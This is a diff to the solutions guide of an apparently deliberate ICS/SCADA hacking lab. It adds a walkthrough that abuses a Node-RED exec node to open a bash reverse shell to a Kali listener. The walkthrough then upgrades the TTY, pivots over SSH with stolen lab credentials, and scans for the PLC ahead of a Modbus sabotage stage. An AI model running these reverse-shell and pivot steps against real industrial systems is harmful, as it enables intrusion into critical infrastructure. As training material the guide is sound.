@@ -58,13 +58,59 @@ This document provides the complete step-by-step solutions for all training leve
 
 **Answer:** `192.168.20.10`
 
-### Steps:
-1.  Change the Node-RED `exec` node command to establish an SSH shell or run remote commands, OR simply SSH from the Node-RED host shell. Since the firewall allows HMI -> EWS SSH, execute commands via Node-RED:
+### Approach A: Non-Interactive (exec node via sshpass)
+1.  Change the Node-RED `exec` node command to run the scan directly over SSH from the HMI:
     ```bash
     sshpass -p 'operator123' ssh -o StrictHostKeyChecking=no operator@192.168.20.20 "nmap -sn 192.168.20.0/24"
     ```
-    *Alternatively, deploy a reverse shell flow to Kali and SSH directly from Kali to EWS.*
-2.  Identify the active PLC IP address: **`192.168.20.10`**.
+2.  The debug node output will list active hosts. Identify the PLC: **`192.168.20.10`**.
+
+---
+
+### Approach B: Interactive Reverse Shell (Recommended)
+
+This approach establishes a full interactive terminal on the SCADA HMI back to your Kali machine, allowing you to manually SSH pivot to the EWS — closely replicating the technique used in the Ukraine Power Grid attack.
+
+#### Step 1 — Start a Listener on Kali
+On the Kali attacker host (`10.10.10.50`), open a terminal and start a TCP listener to catch the incoming shell connection:
+```bash
+nc -nlvp 4444
+```
+
+#### Step 2 — Deploy the Reverse Shell via Node-RED
+Navigate to `http://192.168.100.10:1880/`.
+
+1. Drag an **`inject`** node and an **`exec`** node onto the canvas and wire them together.
+2. Double-click the `exec` node and enter this bash reverse shell payload into the **Command** field:
+   ```bash
+   bash -c 'bash -i >& /dev/tcp/10.10.10.50/4444 0>&1'
+   ```
+3. Click **Deploy**, then click the inject trigger button.
+
+#### Step 3 — Upgrade to a Full Interactive TTY
+Your Kali netcat listener should receive a connection from `192.168.100.10`. You now have a root shell on the SCADA HMI. However, this is a "dumb" shell that cannot handle interactive programs like SSH password prompts. Upgrade it first:
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+Your prompt will change to `root@scada-hmi:~#`, confirming a fully interactive terminal.
+
+#### Step 4 — SSH Pivot to the EWS
+From the upgraded shell on the SCADA HMI, SSH into the Engineering Workstation using the credentials stolen in Level 2:
+```bash
+ssh operator@192.168.20.20
+```
+When prompted for a password, type:
+```
+operator123
+```
+*(The password will not be echoed on screen — this is standard Linux terminal behaviour.)*
+
+#### Step 5 — Reconnaissance
+You are now inside the isolated control network as `operator@engineering-station`. Discover active hosts on the control subnet:
+```bash
+nmap -sn 192.168.20.0/24
+```
+This reveals the active PLC at **`192.168.20.10`**, ready for the Modbus sabotage stage.
 
 ---
 
